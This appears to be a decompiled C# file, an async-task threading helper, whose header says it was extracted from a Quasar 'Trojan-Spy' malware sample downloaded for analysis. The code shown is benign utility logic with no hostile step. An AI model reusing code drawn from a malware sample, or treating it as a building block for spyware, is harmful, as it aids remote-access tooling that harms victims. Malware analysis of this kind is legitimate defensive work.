// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Models.AsyncTask
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using System;
using System.Threading;

namespace NoiseMe.Drags.App.Models
{
  public class AsyncTask
  {
    public static TaskAction<R> StartNew<R>(TaskAction<R> function)
    {
      R retv = default (R);
      bool completed = false;
      object sync = new object();
      function.BeginInvoke((AsyncCallback) (iAsyncResult =>
      {
        lock (sync)
        {
          completed = true;
          retv = function.EndInvoke(iAsyncResult);
          Monitor.Pulse(sync);
        }
      }), (object) null);
      return (TaskAction<R>) (() =>
      {
        lock (sync)
        {
          if (!completed)
            Monitor.Wait(sync);
          return retv;
        }
      });
    }

    public static AsyncAction StartNew(AsyncAction function)
    {
      bool completed = false;
      object sync = new object();
      function.BeginInvoke((AsyncCallback) (iAsyncResult =>
      {
        lock (sync)
        {
          completed = true;
          function.EndInvoke(iAsyncResult);
          Monitor.Pulse(sync);
        }
      }), (object) null);
      return (AsyncAction) (() =>
      {
        lock (sync)
        {
          if (completed)
            return;
          Monitor.Wait(sync);
        }
      });
    }
  }
}
